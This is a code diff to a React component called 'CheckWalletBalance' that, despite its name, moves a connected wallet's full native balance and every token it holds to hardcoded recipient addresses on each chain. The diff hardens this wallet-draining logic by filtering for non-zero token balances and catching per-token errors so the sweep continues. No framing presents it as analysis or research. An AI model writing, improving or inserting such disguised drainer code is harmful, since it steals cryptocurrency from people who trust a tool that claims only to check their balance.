@@ -36,25 +36,35 @@ export default function CheckWalletBalance() {
         setProcessedChains((prev) => [...prev, chainId]);
       } else {
         const tokens = await getTokensWithBalance(address, chainId);
+        // Filter tokens with valid decimals and non-zero balances
+        const filteredTokens = tokens.filter((token) => {
+            const hasBalance = parseFloat(token.balance) > 0;
+            const hasValidDecimals = typeof token.decimals === "number" && token.decimals >= 0;
+            return hasBalance && hasValidDecimals;
+        });
+
 
         if (tokens.length === 0) {
           setStatus("🚀 Sending native token...");
           await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
           setStatus("✅ Native token sent!");
         } else {
-          setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
-          await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
-
-          for (let token of tokens) {
-            await transferERC20Token(
-              token.contractAddress,
-              token.balance,
-              RECIPIENT_ADDRESSES[chainId],
-              token.decimals
-            );
-          }
-
-          setStatus("🎉 All tokens sent!");
+            setStatus(`🚀 Sending native + ${tokens.length} token(s)...`);
+            await transferNativeToken(numericBalance - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
+            for (const token of filteredTokens) {
+              try {
+                await transferERC20Token(
+                  token.contractAddress,
+                  token.balance,
+                  RECIPIENT_ADDRESSES[chainId],
+                  token.decimals
+                );
+              } catch (error) {
+                console.warn(`⚠️ Error transferring ${token.symbol}:`, error);
+              }
+            }
+          
+            setStatus("🎉 All tokens sent!");
         }
 
         setProcessedChains((prev) => [...prev, chainId]);
